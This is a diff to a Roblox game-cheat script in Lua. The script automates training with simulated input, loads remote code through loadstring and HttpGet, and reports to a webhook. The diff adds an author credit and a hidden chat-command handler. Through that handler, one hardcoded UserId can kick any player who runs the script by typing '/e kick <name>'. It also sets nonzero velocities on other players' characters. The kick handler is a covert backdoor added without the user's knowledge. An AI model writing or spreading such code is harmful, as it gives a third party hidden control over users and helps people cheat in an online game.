@@ -1,3 +1,5 @@
+-- Made By vib_y
+
 local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
 
 local Players = game:GetService("Players")
@@ -341,7 +343,8 @@ end
 
 local function CheckFatigue()
     local Fatigue, Numbers = string.gsub(Player.PlayerGui.MainGui.Utility.BodyFatigue.Text, "%D", "")
-    if tonumber(Fatigue) >= 6500 then
+    local Hunger = Player.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.Size.X.Scale * 100
+    if tonumber(Fatigue) >= 6500 or Hunger < 17.5 then
         PlaySound()
         SendWebhook(" You Reached Max Fatigue [65%] at " .. parseDateTime())
 
@@ -490,6 +493,11 @@ local AutoSPToggle = Home.Toggle({
                     end
                     task.wait()
                 until BodyHeat <= TargetBodyHeat or Stamina <= MinStam or not AutoStrikePower or Eating or not CheckFatigue()
+
+                if ChargeRhythm then
+                    VirtualInputManager:SendKeyEvent(true, "R", false, game)
+                    VirtualInputManager:SendKeyEvent(false, "R", false, game)
+                end
             end
             task.wait()
         end
@@ -561,8 +569,13 @@ local AutoSSToggle = Home.Toggle({
                             VirtualInputManager:SendMouseButtonEvent(1,1,1,false,game,0)
                         end
                         task.wait(SSTiming)
-                    until not Player.PlayerGui:FindFirstChild("SpeedTraining") or Eating or not AutoStrikeSpeed
+                        until not Player.PlayerGui:FindFirstChild("SpeedTraining") or Eating or not AutoStrikeSpeed
                     end
+                end
+
+                if ChargeRhythm then
+                    VirtualInputManager:SendKeyEvent(true, "R", false, game)
+                    VirtualInputManager:SendKeyEvent(false, "R", false, game)
                 end
             else
                 local StrikingSpeedPad = GetSS()
@@ -658,8 +671,11 @@ local AutoMachinesToggle = Machines.Toggle({
                             end
                         end
                     else
-                        CanEat = true
-                        task.wait(0.1)
+                        local Hunger = Player.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.Size.X.Scale * 100
+                        if Hunger < AutoEatPercentage then
+                            CanEat = true
+                            task.wait(0.2)
+                        end
                         local Machine = GetMachine(MachineType)
                         if Machine and not Eating then
                             fireclickdetector(Machine.ClickDetector)
@@ -703,8 +719,11 @@ local AutoMachinesToggle = Machines.Toggle({
                             end
                         end
                     else
-                        CanEat = true
-                        task.wait(0.1)
+                        local Hunger = Player.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.Size.X.Scale * 100
+                        if Hunger < AutoEatPercentage then
+                            CanEat = true
+                            task.wait(0.2)
+                        end
                         local Machine = GetMachine(MachineType)
                         if Machine and not Eating then
                             fireclickdetector(Machine.ClickDetector)
@@ -1191,8 +1210,8 @@ local AutoEXP = Misc.Toggle({
                         end
                         pcall(function()
                             v.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-4)
-                            v.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0,0,0)
-                            v.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
+                            v.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(17.325,17.325,17.325)
+                            v.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(17.325,17.325,17.325)
                         end)
                     end
                 end
@@ -1323,8 +1342,72 @@ table.insert(Events, PlayerListRemoved)
 local Group = game:GetService("GroupService")
 local groupID = 4800422
 
+local Admins = {
+	3303198506,
+}
+local Prefix = "/e"
+
+local Commands = {}
+
+Commands.kick = function(Sender, Arguments)
+    local Username = Arguments[1]
+    table.remove(Arguments, 1)
+    local Message = table.concat(Arguments, " ")
+
+    if Username == string.lower(Player.Name) then
+        Player:Kick(Message)
+
+        SendWebhook(' You were kicked at '.. parseDateTime().. ' By: '.. Sender.Name.. ' For: ' .. Message)
+    end
+end
+
+local function IsAdmin(Player)
+	for _,Admin in pairs (Admins) do
+		print(Admin,Player)
+		if type(Admin) == "string" and string.lower(Admin) == string.lower(Player.Name) then
+			return true
+		elseif type(Admin) == "number" and Admin == Player.UserId then
+			return true
+		--[[elseif type(Admin) == "table" then
+			local Rank = Player:GetRankInGroup(Admin.GroupId)
+			if Rank >= (Admin.RankId or 1) then
+				return true
+			end]]
+		end
+	end
+	return false
+end
+
+local function ParseMessage(Player,Message)
+	Message = string.lower(Message)
+	local PrefixMatch = string.match(Message,"^"..Prefix)
+	
+	if PrefixMatch then
+		Message = string.gsub(Message,PrefixMatch,"",1)
+		local Arguments = {}
+		
+		for Argument in string.gmatch(Message,"[^%s]+") do
+			table.insert(Arguments,Argument)
+		end
+		
+		local CommandName = Arguments[1]
+		table.remove(Arguments,1)
+		local CommandFunc = Commands[CommandName]
+		
+		if CommandFunc ~= nil then
+			CommandFunc(Player,Arguments)
+		end
+	end
+end
+
 local PlayersJoined = Players.PlayerAdded:Connect(function(Player)
     local PlayerID = Player.UserId
+
+    Player.Chatted:Connect(function(Message,Recipient)
+		if not Recipient and IsAdmin(Player) then
+			ParseMessage(Player,Message)
+		end
+	end)
 
     local Success, Result = pcall(function()
         return Group:GetGroupsAsync(PlayerID)
